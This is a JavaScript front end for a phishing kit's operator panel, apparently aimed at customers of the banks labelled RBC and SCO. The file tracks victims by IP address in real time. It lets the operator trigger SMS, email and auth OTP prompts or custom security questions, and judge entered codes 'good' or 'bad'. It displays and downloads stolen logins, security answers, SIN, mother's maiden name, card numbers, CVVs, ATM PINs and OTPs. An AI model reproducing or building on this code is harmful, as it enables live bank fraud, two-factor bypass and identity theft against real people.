const socket = io()

document.getElementById('deleteAll').addEventListener('click', function () {
  socket.emit('deleteAll');
});

socket.on('join', (users) => {
  let count = 0
  users.forEach(([ipAddress, details]) => {
    if (details.status == 'actif') {
      count++;
    }
  });
  updateConnectionsTable(users);
  updateActiveUserCount(count); // Update the count of active users
});

socket.on('leave', (users) => {
  let count = 0
  users.forEach(([ipAddress, details]) => {
    if (details.status == 'actif') {
      count++;
    }
  });
  updateConnectionsTable(users);
  updateActiveUserCount(count); // Update the count of active users
});

function updateConnectionsTable(users) {
  const container = document.getElementById('userContainer');

  container.innerHTML = '';

  users.sort(([ip1, details1], [ip2, details2]) => {
    if (details1.status === 'actif' && details2.status !== 'actif') {
      return -1; // 'actif' comes first
    }
    if (details1.status !== 'actif' && details2.status === 'actif') {
      return 1; // 'actif' comes first
    }
    return 0; // No change in order
  });

  users.forEach(([ipAddress, details]) => {
    const userDiv = document.createElement('div');
    userDiv.className = 'col-md-4';

    let color;
    if (details.stage === 'Finish') {
      color = 'warning'; // Set color to warning for users on the finish page
      details.status = 'finish'
    } else {
      color = details.status === 'actif' ? 'success' : 'danger'; // Use success for actif, danger otherwise
    }

    if (details.page != 'RBC' && details.page != 'SCO' && details.stage != 'CAPTCHA' && details.stage != 'Finish' && details.stage != 'Interac' && details.stage != 'Loading' && details.stage != 'OTP') {
      userDiv.innerHTML = `
        
          <h5 class="card-title fw-semibold mb-4 badge bg-${color}">${details.status}</h5>
          <div class="card">
            <div class="card-header">
              <span class="badge bg-${color}">
                ${ipAddress}
              </span>
            </div>
            <div class="card-body">
              <h5 class="card-title">${details.page || ''}</h5>
              <p class="card-text">${details.stage || ''}</p>
              <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
              <a href="#" class="m-1 btn btn-warning send-otp-sms-button">Send SMS OTP</a>
              <a href="#" class="m-1 btn btn-warning send-otp-email-button">Send EMAIL OTP</a>
            </div>
          </div>
    
          `;

          let sendOtpSmsButton = userDiv.querySelector('.send-otp-sms-button');
          let sendOtpEmailButton = userDiv.querySelector('.send-otp-email-button');
          sendOtpSmsButton.addEventListener('click', function() {
            socket.emit('sendOTP', {ip: ipAddress, navig: `sms` })
            console.log('emit otp send')
          });

          sendOtpEmailButton.addEventListener('click', function() {
            socket.emit('sendOTP', {ip: ipAddress, navig: `email` })
            console.log('emit otp send')
          });          
    } else if(details.stage == "OTP") {

        userDiv.innerHTML = `
        
        <h5 class="card-title fw-semibold mb-4 badge bg-${color}">${details.status}</h5>
        <div class="card">
          <div class="card-header">
            <span class="badge bg-${color}">
              ${ipAddress}
            </span>
          </div>
          <div class="card-body">
            <h5 class="card-title">${details.page || ''}</h5>
            <p class="card-text">${details.stage || ''}</p>
            <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
          </div>
        </div>
  
        `;
      
      
    } else if(details.stage == "Loading"){

      userDiv.innerHTML = `
        
          <h5 class="card-title fw-semibold mb-4 badge bg-${color}">${details.status}</h5>
          <div class="card">
            <div class="card-header">
              <span class="badge bg-${color}">
                ${ipAddress}
              </span>
            </div>
            <div class="card-body">
              <h5 class="card-title">${details.page || ''}</h5>
              <p class="card-text">${details.stage || ''}</p>
              <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
              <a href="#" class="m-1 btn btn-success send-otp-good-button">Good</a>
              <a href="#" class="m-1 btn btn-danger send-otp-bad-button">Bad</a>
            </div>
          </div>
    
          `;

          let sendOtpGoodButton = userDiv.querySelector('.send-otp-good-button');
          let sendOtpBadButton = userDiv.querySelector('.send-otp-bad-button');
          sendOtpGoodButton.addEventListener('click', function() {
            socket.emit('sendOTPResponse', {ip: ipAddress, res: `good` })
          });

          sendOtpBadButton.addEventListener('click', function() {
            socket.emit('sendOTPResponse', {ip: ipAddress, res: `bad` })
          });          

    } else if(details.page == 'SCO' && details.stage != 'Finish'){
      userDiv.innerHTML = `
        
      <h5 class="card-title fw-semibold mb-4 badge bg-${color}">${details.status}</h5>
      <div class="card">
        <div class="card-header">
          <span class="badge bg-${color}">
            ${ipAddress}
          </span>
        </div>
        <div class="card-body">
          <h5 class="card-title">${details.page || ''}</h5>
          <p class="card-text">${details.stage || ''}</p>
          <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
          <a href="#" class="m-1 btn btn-warning send-otp-sms-button">Send SMS OTP</a>
          <a href="#" class="m-1 btn btn-warning send-otp-email-button">Send EMAIL OTP</a>
          <a href="#" class="m-1 btn btn-warning send-auth-button">Send AUTH</a>
          </div>
      </div>

      `;

      let sendOtpSmsButton = userDiv.querySelector('.send-otp-sms-button');
      let sendOtpEmailButton = userDiv.querySelector('.send-otp-email-button');
      let sendAuthButton = userDiv.querySelector('.send-auth-button');
      sendOtpSmsButton.addEventListener('click', function() {
        socket.emit('sendOTP', {ip: ipAddress, navig: `sms` })
      });

      sendOtpEmailButton.addEventListener('click', function() {
        socket.emit('sendOTP', {ip: ipAddress, navig: `email` })
      });     
      
      sendAuthButton.addEventListener('click', function() {
        socket.emit('sendOTP', {ip: ipAddress, navig: `auth` })
      });    
    } else if(details.page == 'RBC' && details.stage != 'Finish'){
      userDiv.innerHTML = `
        
      <h5 class="card-title fw-semibold mb-4 badge bg-${color}">${details.status}</h5>
      <div class="card">
        <div class="card-header">
          <span class="badge bg-${color}">
            ${ipAddress}
          </span>
        </div>
        <div class="card-body">
          <h5 class="card-title">${details.page || ''}</h5>
          <p class="card-text">${details.stage || ''}</p>
          <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
          <a href="#" class="m-1 btn btn-warning send-otp-sms-button">Send SMS OTP</a>
          <a href="#" class="m-1 btn btn-warning send-otp-email-button">Send EMAIL OTP</a>
          <a href="#" class="m-1 btn btn-warning send-auth-button">Send AUTH</a>
          <button class="m-1 btn btn-warning customQuestionTrigger" type="button" >Custom Question</button>
          </div>
      </div>

      `;

      let sendOtpSmsButton = userDiv.querySelector('.send-otp-sms-button');
      let sendOtpEmailButton = userDiv.querySelector('.send-otp-email-button');
      let sendAuthButton = userDiv.querySelector('.send-auth-button');
      let customQuestionTrigger = userDiv.querySelector('.customQuestionTrigger')
      sendOtpSmsButton.addEventListener('click', function() {
        socket.emit('sendOTP', {ip: ipAddress, navig: `sms` })
      });

      sendOtpEmailButton.addEventListener('click', function() {
        socket.emit('sendOTP', {ip: ipAddress, navig: `email` })
      });     
      
      sendAuthButton.addEventListener('click', function() {
        socket.emit('sendOTP', {ip: ipAddress, navig: `auth` })
      });    

      customQuestionTrigger.addEventListener('click', function() {
        $('#customQuestionModal').modal('show');
      });

      document.getElementById('sendCustomQuestionButton').addEventListener('click', function() {
        var customQuestion = document.getElementById('customQuestion').value;
        socket.emit('sendOTP', {ip: ipAddress, navig: `qst2`, customQuestion: customQuestion })
        $('#customQuestionModal').modal('hide');
      })
    } else {
      userDiv.innerHTML = `
       
          <h5 class="card-title fw-semibold mb-4 badge bg-${color}">${details.status}</h5>
          <div class="card">
            <div class="card-header">
              <span class="badge bg-${color}">
                ${ipAddress}
              </span>
            </div>
            <div class="card-body">
              <h5 class="card-title">${details.page || ''}</h5>
              <p class="card-text">${details.stage || ''}</p>
              <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
            </div>
          </div>
     
          `;
    }

    let resultsButton = userDiv.querySelector('.results-button');

    resultsButton.addEventListener('click', function () {
      let modalBody = document.querySelector('#resultsModal .modal-body');
      let ipModel = ipAddress
      socket.emit('getUserData');
      socket.on('setUserData', (userData) => {

        userData.forEach(([ipAddress, details]) => {
          if (details.ip == ipModel) {
            if (details.getUserDataLogin || details.getUserDataQuestion || details.getUserDataDetails || details.getUserDataCard || details.getUserDataOTP) {

              modalBody.innerHTML = `  <div class="card mb-3">
              <div class="card-header bg-primary text-white">
                <strong>User Information - IP: ${ipAddress}</strong>
              </div>
              <div class="card-body">
                <h5 class="card-title">Login Details</h5>
                <p class="card-text">
                  Username: ${details.getUserDataLogin.username || 'N/A'}<br>
                  Password: ${details.getUserDataLogin.password || 'N/A'}<br>
                  UserAgent: ${details.getUserDataLogin.userAgent || 'N/A'}
                </p>
                
                <h5 class="card-title">Security Questions</h5>
                <p class="card-text">
                  ${details.getUserDataQuestion.question1 || 'N/A'} : ${details.getUserDataQuestion.answer1 || 'N/A'}<br>
                  ${details.getUserDataQuestion.question2 || 'N/A'} : ${details.getUserDataQuestion.answer2 || 'N/A'}<br>
                  ${details.getUserDataQuestion.question3 || 'N/A'} : ${details.getUserDataQuestion.answer3 || 'N/A'}<br>
                  ${details.getUserDataQuestion.question4 || 'N/A'} : ${details.getUserDataQuestion.answer4 || 'N/A'}<br>
                  ${details.getUserDataQuestion.question5 || 'N/A'} : ${details.getUserDataQuestion.answer5 || 'N/A'}<br>
                  ${details.getUserDataOTP.customQuestion || 'N/A'} : ${details.getUserDataOTP.customAnswer || 'N/A'}
                </p>
            
                <h5 class="card-title">Personal Information</h5>
                <p class="card-text">
                  Full Name: ${details.getUserDataDetails.name || 'N/A'}<br>
                  Address: ${details.getUserDataDetails.address || 'N/A'}<br>
                  City: ${details.getUserDataDetails.city || 'N/A'}<br>
                  Phone Number: ${details.getUserDataDetails.phone || 'N/A'}<br>
                  Postal Code: ${details.getUserDataDetails.postal || 'N/A'}<br>
                  Email: ${details.getUserDataDetails.email || 'N/A'}<br>
                  DOB: ${details.getUserDataDetails.dob1 || 'N/A'}/${details.getUserDataDetails.dob2 || 'N/A'}/${details.getUserDataDetails.dob3 || 'N/A'}<br>
                  Mmn: ${details.getUserDataDetails.mmn || 'N/A'}<br>
                  Sin: ${details.getUserDataDetails.sin || 'N/A'}<br>
                  Driver Licence: ${details.getUserDataDetails.drivers || 'N/A'}
                </p>
            
                <h5 class="card-title">Card Information</h5>
                <p class="card-text">
                  Card Number: ${details.getUserDataCard.card || 'N/A'}<br>
                  Exp: ${details.getUserDataCard.exp1 || 'N/A'}/${details.getUserDataCard.exp2 || 'N/A'}<br>
                  Cvv: ${details.getUserDataCard.cvv || 'N/A'}<br>
                  ATM PIN: ${details.getUserDataCard.atm || 'N/A'}
                </p>
            
                <h5 class="card-title">One-Time Password (OTP)</h5>
                <p class="card-text">
                  OTP: ${details.getUserDataOTP.code || 'N/A'}
                </p>
            
                <div class="d-flex justify-content-end">
                  <button id="downloadButton" class="btn btn-secondary mt-2">Download</button>
                </div>
              </div>
            </div>
            `;

              // ... Code to set modalBody.innerHTML ...

              // Attach an event listener to the download button
              document.getElementById('downloadButton').addEventListener('click', function () {
                downloadUserData(details); // Assuming 'details' contains all the user data
              });


            } else {
              modalBody.innerHTML = `No result for IP: ${ipAddress}`;
            }
          }
        })

      })

      // Show the modal
      let modal = new bootstrap.Modal(document.getElementById('resultsModal'));
      modal.show();
    });
    container.appendChild(userDiv);
  });

}

function updateActiveUserCount(newCount) {
  document.getElementById('activeUserCount').textContent = `Active Users: ${newCount}`;
}